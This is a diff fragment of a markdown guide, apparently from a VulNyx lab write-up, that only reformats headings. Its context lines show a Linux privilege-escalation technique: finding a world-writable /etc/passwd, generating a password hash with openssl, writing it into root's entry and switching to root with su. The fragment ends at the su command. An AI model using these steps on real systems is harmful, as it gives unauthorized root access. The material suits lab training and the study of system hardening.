@@ -82,21 +82,21 @@ gaN4ZcqmaVXfzC0AAAALcm9vdEBzYXRvcmk=
 If a low-privileged user has permissions to write to the `/etc/passwd` file, an attacker can remove the `:x:` (on the `root` user line) and add a **hash**.  
 This will change the file where a user's authentication is performed, from being done through the `/etc/shadow` file to being done through the `/etc/passwd` file.
 
-##### Check Permissions
+**Check Permissions**
 
 ```ruby
 low@vulnyx:~$ ls -l /etc/passwd
 -rw----rw- 1 root root 1395 abr 21 20:16 /etc/passwd
 ```
 
-##### Create Hash
+**Create Hash**
 
 ```ruby
 root@kali:~# openssl passwd -1 "P@ssword123"
 $1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0
 ```
 
-##### Add Hash
+**Add Hash**
 
 ```ruby
 # before
@@ -108,7 +108,7 @@ low@vulnyx:~$ cat /etc/passwd |grep root
 root:$1$TSMXnd0L$DwQWYa.zuPqtZUjyRLWxy0:0:0:root:/root:/bin/bash
 ```
 
-##### Authenticate
+**Authenticate**
 
 ```ruby
 low@vulnyx:~$ su -
